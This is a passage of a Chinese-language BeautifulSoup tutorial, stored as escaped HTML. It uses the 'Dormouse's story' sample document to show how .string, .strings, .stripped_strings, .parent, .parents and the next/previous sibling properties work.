&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;title_tag.string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;The Dormouse&amp;apos;s story&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果一个tag仅有一个子节点,那么这个tag也可以使用 &lt;code&gt;.string&lt;/code&gt; 方法,输出结果与当前唯一子节点的 &lt;code&gt;.string&lt;/code&gt; 结果相同:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;head_tag.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;head_tag.string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;The Dormouse&amp;apos;s story&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果tag包含了多个子节点,tag就无法确定 &lt;code&gt;.string&lt;/code&gt; 方法应该调用哪个子节点的内容, &lt;code&gt;.string&lt;/code&gt; 的输出结果是 &lt;code&gt;None&lt;/code&gt; :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(soup.html.string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;strings-和-stripped-strings&quot;&gt;&lt;a href=&quot;#strings-和-stripped-strings&quot; class=&quot;headerlink&quot; title=&quot;.strings 和 stripped_strings&quot;&gt;&lt;/a&gt;.strings 和 stripped_strings&lt;/h3&gt;&lt;p&gt;如果tag中包含多个字符串 [2] ,可以使用 &lt;code&gt;.strings&lt;/code&gt; 来循环获取:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for string in soup.strings:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(repr(string))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;quot;The Dormouse&amp;apos;s story&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;\n\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;quot;The Dormouse&amp;apos;s story&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;\n\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Once upon a time there were three little sisters; and their names were\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Elsie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;,\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Lacie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos; and\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Tillie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;;\nand they lived at the bottom of a well.&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;\n\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;...&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出的字符串中可能包含了很多空格或空行,使用 &lt;code&gt;.stripped_strings&lt;/code&gt; 可以去除多余空白内容:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for string in soup.stripped_strings:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(repr(string))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;quot;The Dormouse&amp;apos;s story&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;quot;The Dormouse&amp;apos;s story&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Once upon a time there were three little sisters; and their names were&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Elsie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;,&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Lacie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;and&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Tillie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;;\nand they lived at the bottom of a well.&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;...&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;全部是空格的行会被忽略掉,段首和段末的空白会被删除&lt;/p&gt;
&lt;h2 id=&quot;父节点&quot;&gt;&lt;a href=&quot;#父节点&quot; class=&quot;headerlink&quot; title=&quot;父节点&quot;&gt;&lt;/a&gt;父节点&lt;/h2&gt;&lt;p&gt;继续分析文档树,每个tag或字符串都有父节点:被包含在某个tag中&lt;/p&gt;
&lt;h3 id=&quot;parent&quot;&gt;&lt;a href=&quot;#parent&quot; class=&quot;headerlink&quot; title=&quot;.parent&quot;&gt;&lt;/a&gt;.parent&lt;/h3&gt;&lt;p&gt;通过 &lt;code&gt;.parent&lt;/code&gt; 属性来获取某个元素的父节点.在例子“爱丽丝”的文档中,&lt;head&gt;标签是&lt;title&gt;标签的父节点:&lt;/title&gt;&lt;/head&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;title_tag = soup.title&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;title_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;title_tag.parent&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;文档title的字符串也有父节点:&lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;标签&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;title_tag.string.parent&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;文档的顶层节点比如&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;的父节点是 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;html_tag = soup.html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;type(html_tag.parent)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;class &amp;apos;bs4.BeautifulSoup&amp;apos;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;BeautifulSoup&lt;/code&gt; 对象的 &lt;code&gt;.parent&lt;/code&gt; 是None:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(soup.parent)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;parents&quot;&gt;&lt;a href=&quot;#parents&quot; class=&quot;headerlink&quot; title=&quot;.parents&quot;&gt;&lt;/a&gt;.parents&lt;/h3&gt;&lt;p&gt;通过元素的 &lt;code&gt;.parents&lt;/code&gt; 属性可以递归得到元素的所有父辈节点,下面的例子使用了 &lt;code&gt;.parents&lt;/code&gt; 方法遍历了&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签到根节点的所有节点.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;link = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;link&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for parent in link.parents:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if parent is None:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        print(parent)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        print(parent.name)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# body&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [document]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;兄弟节点&quot;&gt;&lt;a href=&quot;#兄弟节点&quot; class=&quot;headerlink&quot; title=&quot;兄弟节点&quot;&gt;&lt;/a&gt;兄弟节点&lt;/h2&gt;&lt;p&gt;看一段简单的例子:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sibling_soup = BeautifulSoup(&amp;quot;&amp;lt;a&amp;gt;&amp;lt;b&amp;gt;text1&amp;lt;/b&amp;gt;&amp;lt;c&amp;gt;text2&amp;lt;/c&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(sibling_soup.prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#     text1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;c&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#     text2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;/c&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;标签和&lt;code&gt;&amp;lt;c&amp;gt;&lt;/code&gt;标签是同一层:他们是同一个元素的子节点,所以&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;c&amp;gt;&lt;/code&gt;可以被称为兄弟节点.一段文档以标准格式输出时,兄弟节点有相同的缩进级别.在代码中也可以使用这种关系.&lt;/p&gt;
&lt;h3 id=&quot;next-sibling-和-previous-sibling&quot;&gt;&lt;a href=&quot;#next-sibling-和-previous-sibling&quot; class=&quot;headerlink&quot; title=&quot;.next_sibling 和 .previous_sibling&quot;&gt;&lt;/a&gt;.next_sibling 和 .previous_sibling&lt;/h3&gt;&lt;p&gt;在文档树中,使用 &lt;code&gt;.next_sibling&lt;/code&gt; 和 &lt;code&gt;.previous_sibling&lt;/code&gt; 属性来查询兄弟节点:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sibling_soup.b.next_sibling&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;c&amp;gt;text2&amp;lt;/c&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sibling_soup.c.previous_sibling&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;text1&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;标签有 &lt;code&gt;.next_sibling&lt;/code&gt; 属性,但是没有 &lt;code&gt;.previous_sibling&lt;/code&gt; 属性,因为&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;标签在同级节点中是第一个.同理,&lt;code&gt;&amp;lt;c&amp;gt;&lt;/code&gt;标签有 &lt;code&gt;.previous_sibling&lt;/code&gt; 属性,却没有 &lt;code&gt;.next_sibling&lt;/code&gt; 属性:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(sibling_soup.b.previous_sibling)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(sibling_soup.c.next_sibling)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;例子中的字符串“text1”和“text2”不是兄弟节点,因为它们的父节点不同:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sibling_soup.b.string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;text1&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(sibling_soup.b.string.next_sibling)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实际文档中的tag的 &lt;code&gt;.next_sibling&lt;/code&gt; 和 &lt;code&gt;.previous_sibling&lt;/code&gt; 属性通常是字符串或空白. 看看“爱丽丝”文档:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/elsie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/lacie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/tillie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果以为第一个&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签的 &lt;code&gt;.next_sibling&lt;/code&gt; 结果是第二个&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签,那就错了,真实结果是第一个&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签和第二个&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签之间的顿号和换行符:&lt;/p&gt;
